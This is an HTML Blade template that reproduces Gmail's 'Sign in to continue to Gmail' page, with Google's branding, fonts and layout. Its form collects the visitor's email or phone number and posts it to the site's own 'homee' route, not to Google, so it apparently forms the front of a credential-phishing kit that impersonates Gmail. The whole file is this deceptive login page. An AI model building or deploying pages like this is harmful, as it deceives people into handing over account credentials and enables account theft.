<!DOCTYPE html>
<html class="responsive" lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="{{ asset('images/favicon.ico') }}" type="image/x-icon">
    <title>Gmail
    </title>
</head>
<style>
    .size {
        width: 28rem;
    }

    .roboto400 {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 16px;
        line-height: 24px;
    }

    .robotojul {
        font-family: 'Roboto', sans-serif;
        color: #202124;
        font-size: 12px;
        line-height: 17px;
    }

    .roboto4002 {
        font-family: 'Roboto', sans-serif;
        color: #5f6368;
        font-size: 14px;
        line-height: 20px;
    }


    .roboto500 {
        font-family: 'Roboto', sans-serif;
        color: #1a73e8;
        font-size: 14px;
    }

    .robotojulito {
        font-family: 'Roboto', sans-serif;
        color: #757575;
        font-size: 12px;
        line-height: 17px;
    }

    .roboto5002 {
        font-family: 'Roboto', sans-serif;
        color: #1a73e8;
        font-size: 14px;
    }

    @font-face {
        font-family: 'font';
        src: url('fonts/awa.ttf') format('truetype');
    }

    .font {
        font-family: 'font', Arial;
    }

    .h1font {
        font-size: 24px;
        line-height: 32px;
    }

    .waticolor {
        color: #174ea6;
        size: 14px;
        line-height: 20px;
    }

    .buttoncolor {
        background-color: #1a73e8;
    }

    .buttonhovercolor {
        background-color: #1b66c9;
    }

    .caca {
        background-color: #f6f9fe;
    }

    .responsive {
        overflow-x: hidden;
    }
</style>

<body class="responsive">
    <div class="border border-gray-200 mx-auto rounded-lg mt-10 size">
        <div class="flex justify-center mt-8">
            <img class="select-none" src="{{ asset('images/logoo.png') }}" width="90" height="60"
                alt="">
        </div>
        <h1 class="text-center text-2xl font h1font">Sign in</h1>
        <h1 class="text-center mt-2 roboto400">to continue to Gmail</h1>
        <div class="mx-10">
            <div class="w-full mt-8">
                <form action="{{ route('homee') }}" method="POST">
                    @csrf
                    <input
                        class="border border-gray-300 rounded px-2 py-3 w-full pb-4 text-base roboto400 select-none focus:outline-none focus:border-blue-500 focus:border-2"
                        type="text" placeholder="Email or phone" name="emailsite">

            </div>
            <div class="mt-1">
                <h1 class="roboto500 font-medium focus:outline-none focus:bg-blue-400"><a href="/">Forgot
                        email?</a></h1>
            </div>
            <div class="mt-10">
                <h1 class="roboto4002">Not your computer? Use Guest mode to sign in privately.</h1>
            </div>
            <div>
                <h1 class="roboto5002 font-medium"><a href="/">Learn more</a></h1>
            </div>
        </div>
        <div class="mx-10 mt-8">
            <div>
                <button class="text-blue-600 font-medium p-1 py-2 rounded hover:bg-gray-100 select-none">Create
                    account</button>
                <button
                    class="text-white font-medium px-6 py-2 rounded buttoncolor float-right hover:bg-blue-600 select-none">Next</button>
                </form>
            </div>
        </div>
        <div class="mb-20">
        </div>
    </div>
    <div class="flex justify-center">
        <div class="mt-4">
            <button class="robotojul font-medium">English (United Kingdom)</button>
            <button class="robotojulito font-medium">Help</button>
            <button class="robotojulito font-medium">Privacy</button>
            <button class="robotojulito font-medium">Terms</button>
        </div>
    </div>
</body>

</html>
